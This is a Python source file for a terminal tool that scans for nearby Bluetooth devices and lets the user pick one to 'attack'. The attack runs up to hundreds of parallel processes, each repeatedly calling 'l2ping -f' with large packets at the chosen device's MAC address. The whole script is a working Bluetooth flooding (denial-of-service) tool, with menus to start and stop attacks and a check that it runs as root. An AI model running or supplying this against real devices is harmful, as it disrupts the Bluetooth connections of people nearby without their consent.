import os
import subprocess
import sys
import tty
import termios
import multiprocessing

deviceName = ""
termSettings = termios.tcgetattr(sys.stdin.fileno())
currentMenu = None

def checkDependencies() -> bool:
    print("Checking dependencies...")
    result = subprocess.run(["hciconfig", "-help"], stdout=subprocess.PIPE)
    hciconfig = result.stdout.decode("utf-8").find("HCI device configuration utility") != -1
    result = subprocess.run(["hcitool", "-help"], stdout=subprocess.PIPE)
    hcitool = result.stdout.decode("utf-8").find("HCI Tool ver") != -1
    result = subprocess.run(["l2ping"], stdout=subprocess.PIPE)
    l2ping = result.stdout.decode("utf-8").find("L2CAP ping") != -1

    print("Trying to find hciconfig... " + "OK" if hciconfig else "NOT FOUND")
    print("Trying to find hcitool... " + "OK" if hcitool else "NOT FOUND")
    print("Trying to find l2ping... " + "OK" if l2ping else "NOT FOUND")

    return hciconfig and hcitool and l2ping

def checkIfAdapterExists(deviceId):
    result = subprocess.run(["hciconfig", f"hci{deviceId}"], stdout=subprocess.PIPE)
    return result.stdout.decode("utf-8").find("Can't get device info") == -1

def checkIfAdapterUp(deviceId):
    result = subprocess.run(["hciconfig", f"hci{deviceId}"], stdout=subprocess.PIPE)
    return result.stdout.decode("utf-8").find("UP") != -1

def enableBluetooth() -> bool:
    global deviceName

    deviceId = input("Enter bluetooth adapter id (default 0): ")
    if len(deviceId) == 0: deviceId = "0"
    
    deviceName = "hci" + deviceId

    if not checkIfAdapterExists(deviceId):
        print(f"Unable to find bluetooth adapter hci{deviceId}")
        return False
    
    if checkIfAdapterUp(deviceId): return True

    print("Trying to enable device...")
    subprocess.run(["hciconfig", f"hci{deviceId}", "up"], stdout=subprocess.PIPE)
    return checkIfAdapterUp(deviceId)

def menuMode(status: bool):
    if status:
        tty.setraw(sys.stdin.fileno())
    else:
        termios.tcsetattr(sys.stdin.fileno(), termios.TCSADRAIN, termSettings)
    
def clear():
    os.system("clear")
    
def printSelected(s):
    print(f"\033[7m{s}\033[m")

class bluetoothDevice:
    IDLE = 0
    ATTACKED = 1
    def __init__(self, mac, name):
        self.mac = mac
        self.name = name
        self.status = bluetoothDevice.IDLE

def scanDevices() -> list[bluetoothDevice]:
    result = subprocess.run(["hcitool", "-i", deviceName, "scan"], stdout=subprocess.PIPE)
    scanResult = result.stdout.decode("utf-8")
    scanResult = scanResult.split("\n")
    scanResult.pop()
    scanResult.pop(0)
    result = list()
    for pair in scanResult:
        pair = pair[1:]
        pair = pair.split("\t")
        result.append(bluetoothDevice(pair[0], pair[1]))
    return result

class bluetoothAttack():
    def __init__(self, packetsize, threadcount, mac):
        self.packetsize = packetsize
        self.threadcount = threadcount
        self.mac = mac
        self.threads:list[multiprocessing.Process] = list()
    
    def start(self):
        global deviceName
        for _ in range(0, self.threadcount):
            thread = multiprocessing.Process(target=bluetoothAttack.attackThread, args=(self.packetsize, self.mac, deviceName))
            self.threads.append(thread)
            thread.start()
    
    def stop(self):
        for thread in self.threads:
            thread.terminate()

    def attackThread(packetsize, mac, device):
        while True:
            subprocess.run(["l2ping", "-i", device, "-s", packetsize, "-f", mac], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

class baseMenu:
    def __init__(self):
        self.line = 0
        self.maxline = 0
        self.title = ""

    def draw(self):
        clear()
        print(f"### {self.title} ###")
        for i in range(0, self.maxline):
            handled = self.drawHandler(i)
            if self.line == i: printSelected(handled)
            else: print(handled)

    def drawHandler(self, i) -> str:
        ...
    
    def select(self):
        ...
    
    def lineUp(self):
        if self.line > 0: self.line -= 1
    
    def lineDown(self):
        if self.line < self.maxline - 1: self.line += 1

class scanMenu(baseMenu):
    def __init__(self):
        super().__init__()
        self.title = "Select device for attack"
        self.scanned:list[bluetoothDevice] = list()
        self.attacks:list[bluetoothAttack] = list()
        self.scan()
    
    def scan(self):
        if len(self.attacks) == 0:
            clear()
            print("Scanning devices...")
            self.scanned = scanDevices()
            self.maxline = 1 + len(self.scanned)
    
    def drawHandler(self, i):
        if i == 0: return "Scan again" if len(self.attacks) == 0 else "Scan again (Unable because one or more attacks are active)"
        else: 
            result = f"{i}. {self.scanned[i-1].name} ({self.scanned[i-1].mac})"
            if self.scanned[i-1].status == bluetoothDevice.ATTACKED:
                result += " (attacking)"
            return result
    
    def select(self):
        if self.line == 0: self.scan()
        else: self.attackPrompt()
    
    def attackPrompt(self):
        clear()
        device = self.scanned[self.line - 1]
        if device.status == bluetoothDevice.IDLE:
            device.status = bluetoothDevice.ATTACKED
            self.scanned[self.line - 1] = device
            packetsize = input("Enter ping packet size (default 600): ")
            if packetsize == "": packetsize = "600"
            threadcount = input("Enter thread count (default 100): ")
            if threadcount == "": threadcount = 100
            else: threadcount = int(threadcount)
            
            attack = bluetoothAttack(packetsize, threadcount, device.mac)
            self.attacks.append(attack)
            attack.start()
        else:
            choice = input("Stop attack? (y/N): ")
            if choice in ("y", "Y"):
                device.status = bluetoothDevice.IDLE
                for i in range(0, len(self.attacks)):
                    if self.attacks[i].mac == device.mac:
                        self.attacks[i].stop()
                        self.attacks.pop(i)
                        break
        
def menuHandler():
    os.system("clear")
    sys.stdin.flush()
    while True:
        currentMenu.draw()
        menuMode(True)
        inputbytes = sys.stdin.buffer.read(1)
        menuMode(False)
        if inputbytes == b'\x03': 
            exit(0)
        elif inputbytes == b'A':
            currentMenu.lineUp()
        elif inputbytes == b'B':
            currentMenu.lineDown()
        elif inputbytes == b'\r':
            currentMenu.select()
        sys.stdin.flush()

if os.geteuid() != 0:
    exit("Root previleges required!")

if not checkDependencies():
    print("Please install programs that was not found and try again.")
    exit(1)
else:
    clear()

if not enableBluetooth():
    print(f"Unable to enable bluetooth adapter.")
    exit(1)

currentMenu = scanMenu()
menuHandler()